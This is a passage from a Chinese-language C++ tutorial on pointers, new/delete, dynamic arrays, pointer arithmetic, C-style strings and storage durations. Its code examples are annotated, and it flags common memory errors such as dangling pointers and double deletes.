类型的指针 p_charstd::string * p_str; // 声明一个指向 string 对象的指针 p_str 获取地址 (&amp; 运算符): 地址运算符 &amp; 用于获取一个变量的内存地址。 初始化指针: 指针在声明时应被初始化，以避免指向不确定的内存地址。常见的初始化方式： 初始化为 nullptr (C++11 及以后): nullptr 是表示空指针的关键字，表示该指针当前不指向任何有效的内存地址。这是推荐的初始化空指针的方式。 初始化为 0 或 NULL: 在 C++11 之前，通常使用 0 或宏 NULL (通常定义为 0) 来表示空指针。虽然仍可用，但 nullptr 类型更安全。 初始化为变量地址: 使用 &amp; 运算符获取一个已存在变量的地址来初始化指针。指针的类型必须与变量的类型匹配（或能隐式转换）。 解引用 (* 运算符): 解引用运算符 * 用于访问指针所指向的内存地址处存储的值。当 * 用于已初始化的有效指针变量前时，它表示“获取指针指向的值”。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; int updates = 6; int * p_updates; // 声明一个指向 int 的指针，未初始化 (危险!) // 初始化指针 int * p_value = nullptr; // 初始化为空指针 (推荐) int * p_zero = 0; // 初始化为空指针 (旧式) // NULL 宏通常在 &lt;cstddef&gt; 或其他 C 头文件中定义 // 使用地址初始化 p_updates = &amp;updates; // 将 updates 变量的地址赋给 p_updates // 访问指针信息 std::cout &lt;&lt; &quot;Value of updates: &quot; &lt;&lt; updates &lt;&lt; std::endl; // 输出 6 std::cout &lt;&lt; &quot;Address of updates: &quot; &lt;&lt; &amp;updates &lt;&lt; std::endl; // 输出 updates 的内存地址 std::cout &lt;&lt; &quot;Value of p_updates (address): &quot; &lt;&lt; p_updates &lt;&lt; std::endl; // 输出存储在 p_updates 中的地址 (同上) // 使用解引用运算符访问指针指向的值 std::cout &lt;&lt; &quot;Value at *p_updates: &quot; &lt;&lt; *p_updates &lt;&lt; std::endl; // 输出 6 (updates 的值) // 使用解引用运算符修改指针指向的值 *p_updates = *p_updates + 1; // 将 p_updates 指向的值 (updates) 加 1 std::cout &lt;&lt; &quot;Now updates has value: &quot; &lt;&lt; updates &lt;&lt; std::endl; // 输出 7 // 指向其他类型 double price = 99.99; double * p_price = &amp;price; // p_price 指向 price std::cout &lt;&lt; &quot;Value at *p_price: &quot; &lt;&lt; *p_price &lt;&lt; std::endl; // 输出 99.99 // int * p_wrong = &amp;price; // 错误! 指针类型 (int*) 与变量类型 (double) 不匹配 return 0;&#125; 关键点: int updates;: updates 是一个 int 变量。 int * p_updates;: p_updates 是一个指针变量，它存储的是一个 int 变量的地址。 p_updates: 存储的地址值。 *p_updates: 存储在该地址处的 int 值。 4.7.2 指针的危险指针非常强大，但也容易出错，是 C++ 中常见的 bug 来源。 解引用未初始化的指针: 如果指针没有被初始化，它会包含一个随机的地址（垃圾值）。解引用这种指针（试图访问该随机地址处的值）会导致未定义行为，通常导致程序崩溃。 123int * p_uninitialized;// std::cout &lt;&lt; *p_uninitialized; // 极度危险! 程序可能崩溃// *p_uninitialized = 100; // 极度危险! 可能覆盖关键数据或导致崩溃 解引用空指针: 解引用 nullptr (或 0, NULL) 同样是未定义行为，通常也会导致程序崩溃。在使用指针前，最好检查它是否为空。 12345int * p_null = nullptr;// std::cout &lt;&lt; *p_null; // 危险! 程序可能崩溃if (p_null != nullptr) &#123; // 检查指针是否有效 std::cout &lt;&lt; *p_null; &#125; 悬挂指针 (Dangling Pointer): 当指针指向的内存已经被释放或不再有效时，该指针就成为悬挂指针。解引用悬挂指针也是未定义行为。这通常发生在 delete 之后（见 4.7.5）或指向局部变量的指针在其作用域结束后仍然存在时。 123456int * p_dangle;&#123; int local_var = 10; p_dangle = &amp;local_var; // p_dangle 指向局部变量&#125; // local_var 在这里被销毁，内存可能被回收// std::cout &lt;&lt; *p_dangle; // 危险! p_dangle 是悬挂指针 内存泄漏 (Memory Leak): 如果使用 new 分配了内存（见 4.7.4），但忘记使用 delete 释放，或者丢失了指向该内存的唯一指针，这块内存就无法再被程序访问或释放，造成内存泄漏。程序运行时间越长，泄漏的内存越多，最终可能耗尽系统资源。 安全使用指针的建议: 总是初始化指针: 声明指针时立即初始化为 nullptr 或一个有效的地址。 在使用前检查: 在解引用指针前，检查它是否为 nullptr。 谨慎处理指针生命周期: 确保指针指向的内存在指针使用期间是有效的。 配对 new 和 delete: 动态分配的内存必须手动释放。 4.7.3 指针和数字虽然指针存储的是内存地址，而地址本质上是数字，但指针类型和整数类型是不同的。不能随意将整数赋给指针（除了 0/nullptr），也不能直接将指针当作普通整数进行算术运算（指针算术有特殊规则，见 4.8）。 1234567891011121314151617181920212223242526#include &lt;iostream&gt;int main() &#123; int value = 10; int * p_value = &amp;value; // 指针的值是地址 (一个数字) std::cout &lt;&lt; &quot;Address stored in p_value: &quot; &lt;&lt; p_value &lt;&lt; std::endl; // 不能直接将任意整数赋给指针 // p_value = 1000; // 错误! 类型不匹配 (除非使用 reinterpret_cast，但通常不安全) p_value = nullptr; // 合法，赋空指针 p_value = 0; // 合法，赋空指针 // 指针可以转换为整数 (通常使用 reinterpret_cast，不推荐) // uintptr_t address_as_int = reinterpret_cast&lt;uintptr_t&gt;(p_value); // std::cout &lt;&lt; &quot;Address as integer: &quot; &lt;&lt; address_as_int &lt;&lt; std::endl; // 整数不能直接转换为指针 (除了 0) int address_int = 2000; // int * p_from_int = address_int; // 错误! // int * p_from_int = reinterpret_cast&lt;int*&gt;(address_int); // 可以编译，但极度危险 return 0;&#125; 将指针视为地址，而不是普通的数字，有助于避免类型错误和不安全的操作。 4.7.4 使用new来分配内存new 运算符用于在程序的自由存储区 (Free Store) 或 堆 (Heap) 上动态分配内存。这允许你在运行时根据需要创建变量或对象，而不是在编译时就确定。 语法: 123456pointerVariable = new typeName;// 或者在声明时分配typeName * pointerVariable = new typeName;// 也可以带初始化器typeName * pointerVariable = new typeName (initializer); // C++98/03typeName * pointerVariable = new typeName &#123;initializer&#125;; // C++11 列表初始化 new: 运算符。 typeName: 要分配内存的数据类型。 initializer (可选): 用于初始化新分配内存的值。 工作流程: new 在自由存储区找到一块足够大的、未使用的内存块，以存储 typeName 类型的数据。 new 返回这块内存的起始地址。 这个地址被赋给一个相应类型的指针变量。 如果 new 无法分配所需的内存（例如内存不足），它会抛出一个 std::bad_alloc 异常（除非使用了 new (std::nothrow) 版本，该版本在失败时返回 nullptr）。 用法与示例: 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;new&gt; // 为了 std::bad_alloc (虽然不一定需要显式包含) 和 std::nothrowint main() &#123; // 分配一个 int 的内存 int * p_int = new int; // 在自由存储区分配一个 int 大小的内存 if (p_int == nullptr) &#123; // 理论检查 (对于普通 new，失败会抛异常) std::cout &lt;&lt; &quot;Memory allocation failed!&quot; &lt;&lt; std::endl; return 1; &#125; *p_int = 101; // 通过指针访问并赋值 // 分配一个 double 并初始化 double * p_double = new double (99.99); // 分配并初始化为 99.99 // 或者 C++11 列表初始化 // double * p_double = new double &#123;99.99&#125;; std::cout &lt;&lt; &quot;Dynamically allocated int: &quot; &lt;&lt; *p_int &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Dynamically allocated double: &quot; &lt;&lt; *p_double &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Address of int: &quot; &lt;&lt; p_int &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Address of double: &quot; &lt;&lt; p_double &lt;&lt; std::endl; // --- 内存释放将在下一节讲解 --- // delete p_int; // delete p_double; // 使用 nothrow 版本 (失败时返回 nullptr) int * p_lots_of_ints = new (std::nothrow) int[1000000000]; // 尝试分配巨大数组 if (p_lots_of_ints == nullptr) &#123; std::cout &lt;&lt; &quot;Huge memory allocation failed, but program continues.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Huge memory allocation succeeded (unlikely).&quot; &lt;&lt; std::endl; // delete[] p_lots_of_ints; // 如果成功，需要释放 &#125; return 0;&#125; 动态分配的内存不会像自动变量那样在作用域结束时自动释放。程序员必须负责在不再需要时手动释放它。 4.7.5 使用delete释放内存delete 运算符用于释放由 new 分配的内存，将其归还给自由存储区，以便后续可以重新分配使用。 语法: 1delete pointerVariable; delete: 运算符。 pointerVariable: 指向由 new（**不是 new[]**）分配的内存的指针。 工作流程: delete 接收一个指针，该指针必须指向由 new 分配的内存块的起始地址。 delete 释放该指针指向的内存块。 指针变量本身的值不会被自动修改（它仍然存储着那个现在无效的地址），成为**悬挂指针 (Dangling Pointer)**。 重要规则: new 和 delete 必须配对使用: 每个 new 都应该对应一个 delete。 不要 delete 同一块内存两次: 对同一块内存执行两次 delete 是未定义行为。 不要 delete 不是由 new 分配的内存: 例如，不要 delete 指向自动变量（栈变量）或静态变量的指针。 不要 delete 空指针 (nullptr): 对空指针执行 delete 是安全且无效果的。 delete 之后将指针设为 nullptr: 释放内存后，最好立即将指针设置为 nullptr，以防止它成为悬挂指针被意外使用。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;int main() &#123; // 1. 分配内存 int * p_value = new int (42); double * p_temp = new double; *p_temp = 123.45; std::cout &lt;&lt; &quot;Before delete:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; p_value points to: &quot; &lt;&lt; *p_value &lt;&lt; &quot; at address &quot; &lt;&lt; p_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot; p_temp points to: &quot; &lt;&lt; *p_temp &lt;&lt; &quot; at address &quot; &lt;&lt; p_temp &lt;&lt; std::endl; // 2. 释放内存 delete p_value; delete p_temp; std::cout &lt;&lt; &quot;\\nAfter delete:&quot; &lt;&lt; std::endl; // p_value 和 p_temp 现在是悬挂指针! std::cout &lt;&lt; &quot; p_value still holds address: &quot; &lt;&lt; p_value &lt;&lt; std::endl; // std::cout &lt;&lt; &quot; Accessing *p_value: &quot; &lt;&lt; *p_value &lt;&lt; std::endl; // 危险! 未定义行为 // 3. 将指针设为 nullptr (好习惯) p_value = nullptr; p_temp = nullptr; std::cout &lt;&lt; &quot;After setting to nullptr:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; p_value holds: &quot; &lt;&lt; p_value &lt;&lt; std::endl; // 输出 0 或类似表示空指针的值 // 对 nullptr 调用 delete 是安全的 delete p_value; // 无效果 delete p_temp; // 无效果 // 错误示例: int stack_var = 10; int * p_stack = &amp;stack_var; // delete p_stack; // 严重错误! 不能 delete 栈内存 int * p1 = new int; int * p2 = p1; // p1 和 p2 指向同一块内存 delete p1; // delete p2; // 严重错误! 删除了同一块内存两次 return 0;&#125; 忘记 delete 会导致内存泄漏，而错误地使用 delete 则可能导致程序崩溃或数据损坏。正确管理动态内存是 C++ 编程中的一项重要技能。 4.7.6 使用new来创建动态数组除了分配单个变量的内存，new 也可以用来动态分配数组。这在你需要在运行时确定数组大小时非常有用。 语法: 123pointerVariable = new typeName [numberOfElements];// 或者typeName * pointerVariable = new typeName [numberOfElements]; new: 运算符。 typeName: 数组元素的数据类型。 numberOfElements: 数组的大小，可以是一个变量或表达式，在运行时计算其值。 []: 表明要分配的是一个数组。 new[] 会分配一块连续的内存，足以容纳 numberOfElements 个 typeName 类型的元素，并返回指向数组第一个元素的指针。 释放动态数组 (delete[]): 释放由 new[] 分配的数组内存必须使用 delete[] 运算符，而不是 delete。 1delete [] pointerVariable; delete[]: 用于释放数组内存的运算符。 pointerVariable: 指向由 new[] 分配的数组内存的指针。 delete[] 和 delete 的区别至关重要: delete[] 知道需要释放的是一个数组，它会正确地调用数组中每个对象（如果是类类型）的析构函数（如果需要），并释放整个数组占用的内存。 如果对 new[] 分配的内存使用 delete（没有 []），行为是未定义的。对于基本类型可能看似正常工作（但仍是错误的），但对于包含对象的数组，很可能只调用第一个对象的析构函数，并可能导致内存损坏或泄漏。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;int main() &#123; int size; std::cout &lt;&lt; &quot;Enter the size of the dynamic array: &quot;; std::cin &gt;&gt; size; if (size &lt;= 0) &#123; std::cout &lt;&lt; &quot;Invalid size.&quot; &lt;&lt; std::endl; return 1; &#125; // 1. 使用 new[] 分配动态数组 int * dynArray = new int[size]; // 检查分配是否成功 (可选，对于普通 new[] 失败会抛异常) if (dynArray == nullptr) &#123; std::cout &lt;&lt; &quot;Memory allocation failed!&quot; &lt;&lt; std::endl; return 1; &#125; // 2. 像普通数组一样使用指针访问动态数组元素 for (int i = 0; i &lt; size; ++i) &#123; dynArray[i] = i * 10; // 使用数组下标访问 &#125; std::cout &lt;&lt; &quot;Dynamic array elements:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; size; ++i) &#123; std::cout &lt;&lt; &quot; dynArray[&quot; &lt;&lt; i &lt;&lt; &quot;] = &quot; &lt;&lt; *(dynArray + i) &lt;&lt; std::endl; // 也可以使用指针算术访问 &#125; // 3. 使用 delete[] 释放动态数组内存 delete [] dynArray; // 4. 将指针设为 nullptr (好习惯) dynArray = nullptr; std::cout &lt;&lt; &quot;Dynamic array deleted.&quot; &lt;&lt; std::endl; // 错误示例: double * p_arr = new double[10]; // delete p_arr; // 错误! 应该使用 delete [] p_arr; return 0;&#125; 总结: 使用 new typeName[size] 分配动态数组。 使用 delete [] pointerVariable 释放动态数组。 必须匹配 new[] 和 delete[]，否则行为未定义。 动态数组提供了在运行时确定数组大小的灵活性，但需要程序员负责内存管理。 4.8 指针、数组和指针算术指针和数组在 C++ 中有着非常紧密的联系。理解这种关系以及指针算术对于有效地使用 C++ 处理内存和数据集合至关重要。 4.8.1 程序说明指针算术允许我们对指针执行一些特殊的算术运算，主要是加法和减法，以便在内存中移动，特别是在数组中。 指针与数组名的关系: 在 C++ 中，数组名在很多情况下会被隐式地当作指向其第一个元素的指针。 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;int main() &#123; double wages[3] = &#123;1000.0, 2000.0, 3000.0&#125;; double *p_wages = wages; // 数组名 wages 被当作指向第一个元素的指针 (&amp;wages[0]) std::cout &lt;&lt; &quot;Address of first element (&amp;wages[0]): &quot; &lt;&lt; &amp;wages[0] &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Value of array name (wages): &quot; &lt;&lt; wages &lt;&lt; std::endl; // 输出与 &amp;wages[0] 相同 std::cout &lt;&lt; &quot;Value of pointer (p_wages): &quot; &lt;&lt; p_wages &lt;&lt; std::endl; // 输出与 &amp;wages[0] 相同 // 通过指针访问数组元素 std::cout &lt;&lt; &quot;First element via pointer (*p_wages): &quot; &lt;&lt; *p_wages &lt;&lt; std::endl; // 输出 1000.0 // 指针算术: 将指针移动到下一个元素 p_wages = p_wages + 1; // 指针加 1 std::cout &lt;&lt; &quot;Address after p_wages + 1: &quot; &lt;&lt; p_wages &lt;&lt; std::endl; // 指向 wages[1] 的地址 std::cout &lt;&lt; &quot;Value at *(p_wages + 1) (now *p_wages): &quot; &lt;&lt; *p_wages &lt;&lt; std::endl; // 输出 2000.0 // 使用数组下标访问 (即使是通过指针) p_wages = wages; // 重置指针指向第一个元素 std::cout &lt;&lt; &quot;Accessing via pointer subscript p_wages[1]: &quot; &lt;&lt; p_wages[1] &lt;&lt; std::endl; // 输出 2000.0 std::cout &lt;&lt; &quot;Accessing via array name subscript wages[1]: &quot; &lt;&lt; wages[1] &lt;&lt; std::endl; // 输出 2000.0 // 数组名和指针的区别: // 1. sizeof: sizeof(wages) 是整个数组的大小 (3 * sizeof(double)) // sizeof(p_wages) 是指针本身的大小 (通常 4 或 8 字节) // 2. 地址: &amp;wages 是整个数组的地址 (类型是 double(*)[3]) // &amp;p_wages 是指针变量 p_wages 自身的地址 // 3. 修改: 数组名 wages 是常量，不能修改 (不能 wages = wages + 1;) // 指针 p_wages 是变量，可以修改指向其他地址 (p_wages = p_wages + 1;) std::cout &lt;&lt; &quot;sizeof(wages): &quot; &lt;&lt; sizeof(wages) &lt;&lt; std::endl; std::cout &lt;&lt; &quot;sizeof(p_wages): &quot; &lt;&lt; sizeof(p_wages) &lt;&lt; std::endl; return 0;&#125; 指针算术规则: 指针加整数 p + n: 结果是一个指向 p 原来指向位置之后第 n 个元素的地址。编译器会根据指针指向的类型大小自动计算实际地址偏移量（地址 = p的地址 + n * sizeof(指向的类型)）。 指针减整数 p - n: 结果是一个指向 p 原来指向位置之前第 n 个元素的地址。 指针减指针 p1 - p2: 结果是两个指针之间相隔的元素数量（一个整数）。只有当两个指针指向同一个数组（或超出末尾一个位置）中的元素时，这个操作才有意义。结果的类型是 std::ptrdiff_t (在 &lt;cstddef&gt; 中定义)。 递增/递减: ++p, p++, --p, p-- 分别使指针指向下一个或上一个元素。 比较: 可以使用关系运算符 (&lt;, &gt;, &lt;=, &gt;=) 比较指向同一个数组元素的指针，判断它们的相对位置。也可以使用 == 和 != 比较指针是否指向同一个地址（或是否都为空）。 数组下标和指针的关系: 表达式 arrayName[i] 在 C++ 中等价于 *(arrayName + i)。同样，如果 p 是一个指向数组元素的指针，p[i] 等价于 *(p + i)。 这意味着你可以对数组名使用指针算术（概念上），也可以对指针使用数组下标表示法。 4.8.2 指针小结让我们回顾一下关于指针的关键概念： 声明: 使用 typeName * pointerName; 声明一个指向 typeName 类型数据的指针。 初始化: 使用 &amp; 获取变量地址: pointerName = &amp;variableName; 初始化为空指针: pointerName = nullptr; (C++11) 或 pointerName = 0; 使用 new 分配动态内存: pointerName = new typeName; 或 pointerName = new typeName[size]; 解引用: 使用 * 访问指针指向的值: value = *pointerName; 或 *pointerName = newValue;。 指针与数组: 数组名通常可视为指向第一个元素的常量指针。指针算术允许在数组元素间移动。array[i] 等价于 *(array + i)。 动态内存: 使用 new 分配，必须使用 delete (对应 new) 或 delete[] (对应 new[]) 释放。 危险: 未初始化指针、空指针解引用、悬挂指针、内存泄漏、错误的 delete/delete[] 使用。 指针本身 vs 指向的值: pointerName 存储的是地址，*pointerName 是该地址处的值。 4.8.3 指针和字符串C 风格字符串本质上是 char 类型的数组，以空字符 \\0 结尾。因此，指针在处理 C 风格字符串时非常常用。 字符串字面值: 字符串字面值（如 &quot;Hello&quot;) 在内存中存储为 const char 数组，并以 \\0 结尾。字符串字面值本身可以被当作指向其第一个字符的 const char* 指针。 char 指针: 可以声明 char* 或 const char* 指针来指向 C 风格字符串。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;cstring&gt; // 为了 strlen()int main() &#123; char animal[20] = &quot;bear&quot;; // animal 是 char 数组 const char *bird = &quot;wren&quot;; // bird 是指向 &quot;wren&quot; 字符串字面值第一个字符 &#x27;w&#x27; 的指针 char *p_animal; // 未初始化的 char 指针 std::cout &lt;&lt; animal &lt;&lt; &quot; and &quot; &lt;&lt; bird &lt;&lt; std::endl; // cout 知道如何处理 char* (打印直到 \\0) // 指针指向数组 p_animal = animal; // p_animal 指向 animal 数组的第一个字符 &#x27;b&#x27; std::cout &lt;&lt; &quot;Pointer p_animal points to: &quot; &lt;&lt; p_animal &lt;&lt; std::endl; // 输出 &quot;bear&quot; // 访问字符串内容 std::cout &lt;&lt; &quot;First char via array: &quot; &lt;&lt; animal[0] &lt;&lt; std::endl; // b std::cout &lt;&lt; &quot;First char via pointer: &quot; &lt;&lt; *p_animal &lt;&lt; std::endl; // b // 指针算术遍历字符串 std::cout &lt;&lt; &quot;Using pointer arithmetic:&quot; &lt;&lt; std::endl; const char *p_bird = bird; while (*p_bird != &#x27;\\0&#x27;) &#123; // 循环直到遇到空字符 std::cout &lt;&lt; *p_bird &lt;&lt; &quot; &quot;; p_bird++; // 指针移动到下一个字符 &#125; std::cout &lt;&lt; std::endl; // 字符串字面值和指针 const char *p_literal = &quot;This is a literal&quot;; std::cout &lt;&lt; p_literal &lt;&lt; std::endl; // p_literal[0] = &#x27;t&#x27;; // 错误! 字符串字面值通常是只读的 (const char*) // 动态分配字符串 char *p_dynamic_str = new char[strlen(&quot;Dynamic String&quot;) + 1]; // +1 为了空字符 strcpy(p_dynamic_str, &quot;Dynamic String&quot;); // 使用 strcpy 复制 (不安全，最好用 strncpy 或 C++ string) std::cout &lt;&lt; &quot;Dynamic string: &quot; &lt;&lt; p_dynamic_str &lt;&lt; std::endl; delete [] p_dynamic_str; // 释放动态分配的数组 p_dynamic_str = nullptr; return 0;&#125; 注意: cout 对 char* 有特殊处理，它会打印从指针指向地址开始直到遇到空字符 \\0 的所有字符。 修改字符串字面值是未定义行为，应使用 const char* 指向它们。 处理 C 风格字符串时要特别注意缓冲区溢出问题（例如使用 strcpy 时目标数组不够大），并确保字符串以 \\0 结尾。std::string 类通常是更安全、更方便的选择。 4.8.4 使用new创建动态结构就像可以动态分配基本类型和数组一样，也可以使用 new 动态创建结构体（或类）对象。 分配: 1StructureName * pointerVariable = new StructureName; 这会在自由存储区分配足够存储 StructureName 结构所有成员的内存，并调用该结构的构造函数（如果是类或有构造函数的结构），然后返回指向新创建结构的指针。 访问成员: 当通过指针访问结构或类的成员时，不能直接使用点运算符 .。有两种方式： 解引用再用点 ((*ptr).member): 先解引用指针 *ptr 得到结构本身，然后使用点运算符访问成员。括号是必需的，因为点运算符的优先级高于解引用运算符。 箭头运算符 (ptr-&gt;member): 这是更常用、更简洁的方式。箭头运算符 -&gt; 专门用于通过指针访问其指向的结构或类的成员。ptr-&gt;member 完全等价于 (*ptr).member。 释放: 使用 delete 释放由 new 创建的单个结构对象。delete 会先调用该对象的析构函数（如果需要），然后释放内存。 12delete pointerVariable;pointerVariable = nullptr; // 好习惯 用法与示例: 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;#include &lt;string&gt;struct Inflatable &#123; std::string name; float volume; double price;&#125;;int main() &#123; // 动态创建 Inflatable 结构 Inflatable *ps = new Inflatable; // 在自由存储区创建结构 // 访问成员 // 方法 1: 解引用和点运算符 (*ps).name = &quot;Dynamic Floatie&quot;; (*ps).volume = 1.5f; // 方法 2: 箭头运算符 (更常用) ps-&gt;price = 29.99; std::cout &lt;&lt; &quot;Dynamically created structure:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Name: &quot; &lt;&lt; ps-&gt;name &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Volume: &quot; &lt;&lt; (*ps).volume &lt;&lt; std::endl; // 两种方式都可以用 std::cout &lt;&lt; &quot; Price: &quot; &lt;&lt; ps-&gt;price &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Address: &quot; &lt;&lt; ps &lt;&lt; std::endl; // 释放动态创建的结构 delete ps; ps = nullptr; std::cout &lt;&lt; &quot;Structure deleted.&quot; &lt;&lt; std::endl; return 0;&#125; 4.8.5 自动存储、静态存储和动态存储C++ 程序中的变量和数据根据其内存分配方式和生命周期，可以分为三种主要的存储类别： 自动存储持续性 (Automatic Storage Duration): 内存区域: 通常在称为栈 (Stack) 的内存区域分配。 分配/释放: 内存的分配和释放在函数（或代码块）进入和退出时自动进行。 生命周期: 变量在声明它的函数或代码块执行期间存在，块结束时自动销毁。 例子: 函数内部声明的非 static 局部变量（包括函数参数）。 特点: 分配和释放速度快，管理简单（自动），但空间有限，生命周期受限于作用域。 静态存储持续性 (Static Storage Duration): 内存区域: 在程序的整个生命周期内都存在于内存的某个固定区域（通常是静态/全局数据区）。 分配/释放: 内存在程序启动时分配（或首次使用时，对于某些静态变量），在程序结束时释放。 生命周期: 从程序开始执行到程序结束。 例子: 在函数外部声明的变量（全局变量）、使用 static 关键字在函数内部或类内部声明的变量。 特点: 生命周期长，可以跨函数调用保持其值，但全局变量可能导致命名冲突和管理复杂性。 动态存储持续性 (Dynamic Storage Duration): 内存区域: 在称为自由存储区 (Free Store) 或 堆 (Heap) 的内存区域分配。 分配/释放: 内存由程序员使用 new (或 malloc 等 C 函数) 显式分配，并且必须使用 delete (或 free) 显式释放。 生命周期: 从 new 分配成功开始，直到程序员使用 delete 释放为止。生命周期与函数或代码块的作用域无关。 例子: 使用 new 创建的变量、数组或对象。 特点: 提供了最大的灵活性，可以在运行时根据需要分配任意大小的内存，生命周期由程序员控制。但管理复杂，容易出现内存泄漏（忘记 delete）或悬挂指针（delete 后仍使用指针）等问题。 示例对比: 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;int global_static_var = 10; // 静态存储 (全局)static int file_static_var = 20; // 静态存储 (文件作用域)void func() &#123; int auto_var = 30; // 自动存储 (栈) static int func_static_var = 40; // 静态存储 (函数作用域，只初始化一次) int *dynamic_var = new int(50); // 动态存储 (堆) std::cout &lt;&lt; &quot; Inside func:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; auto_var address: &quot; &lt;&lt; &amp;auto_var &lt;&lt; &quot; value: &quot; &lt;&lt; auto_var &lt;&lt; std::endl; std::cout &lt;&lt; &quot; func_static_var address: &quot; &lt;&lt; &amp;func_static_var &lt;&lt; &quot; value: &quot; &lt;&lt; ++func_static_var &lt;&lt; std::endl; std::cout &lt;&lt; &quot; dynamic_var address: &quot; &lt;&lt; dynamic_var &lt;&lt; &quot; value: &quot; &lt;&lt; *dynamic_var &lt;&lt; std::endl; delete dynamic_var; // 必须手动释放动态内存 dynamic_var = nullptr;&#125; // auto_var 在这里销毁int main() &#123; std::cout &lt;&lt; &quot;Global static var address: &quot; &lt;&lt; &amp;global_static_var &lt;&lt; &quot; value: &quot; &lt;&lt; global_static_var &lt;&lt; std::endl; std::cout &lt;&lt; &quot;File static var address: &quot; &lt;&lt; &amp;file_static_var &lt;&lt; &quot; value: &quot; &lt;&lt; file_static_var &lt;&lt; std::endl; std::cout &lt;&lt; &quot;\\nCalling func first time:&quot; &lt;&lt; std::endl; func(); std::cout &lt;&lt; &quot;\\nCalling func second time:&quot; &lt;&lt; std::endl; func(); // 注意 func_static_var 的值会保持 // int* dangling_ptr; // &#123; // int temp_auto = 100; // 自动存储 // dangling_ptr = &amp;temp_auto; // &#125; // temp_auto 销毁 // std::cout &lt;&lt; *dangling_ptr; // 错误! 悬挂指针 return 0;&#125; 理解这三种存储方式对于编写健壮、高效且无内存错误的 C++ 程序至关重要。现代 C++ 倾向于使用 RAII (Resource Acquisition Is Initialization) 技术和智能指针（如 std::unique_ptr, std::shared_ptr）来自动管理动态内存，以减少手动 new/delete 带来的风险。 4.9 类型组合C++ 的强大之处在于其类型系统允许你将基本类型、复合类型（数组、结构、共用体、枚举）和指针以多种方式组合起来，创建更复杂的数据结构来精确地模拟现实世界的问题。 本章我们已经接触了一些组合： 结构数组 (Array of Structures): 数组的每个元素都是一个结构体 (见 4.4.5)。 结构包含 std::string 成员: 结构体可以包含类类型的成员 (见 4.4.3)。 指针指向结构: 可以声明指向结构体对象的指针 (见 4.8.4)。 指针指向数组 (或数组名视为指针): 指针可以用来操作数组 (见 4.8.1)。 本节将进一步探讨一些常见的类型组合方式。 1. 结构包含数组成员: 结构体可以包含数组作为其成员。 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;struct StudentGrades &#123; std::string studentName; int grades[5]; // 包含一个 int 数组作为成员 int numGrades; // 记录实际存储的成绩数量&#125;;int main() &#123; StudentGrades alice; alice.studentName = &quot;Alice&quot;; alice.grades[0] = 95; alice.grades[1] = 88; alice.grades[2] = 92; alice.numGrades = 3; std::cout &lt;&lt; alice.studentName &lt;&lt; &quot;&#x27;s first grade: &quot; &lt;&lt; alice.grades[0] &lt;&lt; std::endl; double sum = 0; for (int i = 0; i &lt; alice.numGrades; ++i) &#123; sum += alice.grades[i]; &#125; if (alice.numGrades &gt; 0) &#123; std::cout &lt;&lt; &quot;Average grade: &quot; &lt;&lt; sum / alice.numGrades &lt;&lt; std::endl; &#125; return 0;&#125; 2. 结构包含指针成员: 结构体可以包含指针作为成员。这常用于指向动态分配的内存或指向其他数据结构。 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;struct DynamicData &#123; std::string label; int* data_ptr; // 指向动态分配的 int 数组 int size;&#125;;int main() &#123; DynamicData myData; myData.label = &quot;Sensor Readings&quot;; myData.size = 10; myData.data_ptr = new int[myData.size]; // 动态分配内存 // 初始化动态数据 for (int i = 0; i &lt; myData.size; ++i) &#123; myData.data_ptr[i] = i * i; &#125; std::cout &lt;&lt; &quot;Label: &quot; &lt;&lt; myData.label &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Data at index 3: &quot; &lt;&lt; myData.data_ptr[3] &lt;&lt; std::endl; // 输出 9 // **重要:** 必须手动释放指针成员指向的动态内存 delete [] myData.data_ptr; myData.data_ptr = nullptr; // 避免悬挂指针 return 0;&#125; 注意: 当结构包含指针成员指向动态内存时，需要特别注意内存管理（复制、赋值、析构），这通常涉及到类的特殊成员函数（拷贝构造函数、拷贝赋值运算符、析构函数），我们将在后续章节深入学习。 3. 指针数组 (Array of Pointers): 可以创建数组，其每个元素都是一个指针。 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;int main() &#123; int a = 10, b = 20, c = 30; int* ptr_array[3]; // 声明一个包含 3 个 int* 指针的数组 ptr_array[0] = &amp;a; // 第一个元素指向 a ptr_array[1] = &amp;b; // 第二个元素指向 b ptr_array[2] = &amp;c; // 第三个元素指向 c std::cout &lt;&lt; &quot;Values via pointer array:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 3; ++i) &#123; std::cout &lt;&lt; &quot; Value at *ptr_array[&quot; &lt;&lt; i &lt;&lt; &quot;]: &quot; &lt;&lt; *ptr_array[i] &lt;&lt; std::endl; &#125; // 也可以指向动态分配的内存 int* dyn_ptr_array[2]; dyn_ptr_array[0] = new int(100); dyn_ptr_array[1] = new int(200); std::cout &lt;&lt; &quot;\\nDynamic values:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; *dyn_ptr_array[0] &lt;&lt; std::endl; std::cout &lt;&lt; *dyn_ptr_array[1] &lt;&lt; std::endl; // 